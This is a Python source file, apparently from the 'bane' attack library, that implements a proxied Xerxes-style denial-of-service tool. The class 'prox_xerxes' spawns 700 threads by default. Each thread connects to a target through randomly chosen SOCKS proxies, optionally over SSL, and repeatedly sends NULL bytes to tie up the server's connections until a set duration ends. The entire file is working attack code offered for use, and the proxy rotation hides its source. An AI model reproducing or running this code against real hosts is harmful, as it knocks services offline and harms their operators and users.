from bane.ddos.utils import *

class prox_xerxes(DDoS_Class):
    def __init__(
        self,
        u,
        scraping_timeout=15,
        p=80,
        threads_daemon=True,
        threads=700,
        timeout=5,
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None,
        duration=60,
        ssl_on=False,
        logs=True,
    ):
        self.ssl_on=ssl_on
        self.proxies=Proxies_Interface.get_socket_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        self.proxies=[x for x in self.proxies if x['proxy_type'] in ['socks4','socks5','s4','s5']]
        if self.proxies==[]:
            self.proxies=[{'proxy_host':None,'proxy_port':None,'proxy_username':None,'proxy_password':None,'proxy_type':None}]
        self.stop = False
        self.counter = 0
        self.fails=0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.logs = logs
        self.id_key = 0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
                self.id_key += 1
            except:
                pass

    def attack(self):
        try:
            x = self.id_key
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                proxy=random.choice(self.proxies)
                try:
                    s=Proxies_Getter.get_proxy_socket(self.target,self.port,timeout=self.timeout,**proxy)
                    if self.port==443 or self.ssl_on==True:
                        s=Socket_Connection.wrap_socket_with_ssl(s,self.target)
                    while True:
                        if (
                            int(time.time() - self.start) >= self.duration
                        ):  # this is a safety mechanism so the attack won't run forever
                            break
                        if self.stop == True:
                            break
                        try:
                            s.send("\x00".encode("utf-8"))  # send NULL character
                            self.counter+=1
                            if self.logs == True:
                                sys.stdout.write(
                                    "\r[{}: Voly sent-->{}]     ".format(x,proxy['proxy_host'])
                                )
                                sys.stdout.flush()
                        except:
                            self.fails+=1
                            break
                        time.sleep(0.2)
                except:
                     self.fails+=1
                self.counter -= 1
                time.sleep(0.3)
            self.kill()
        except:
            pass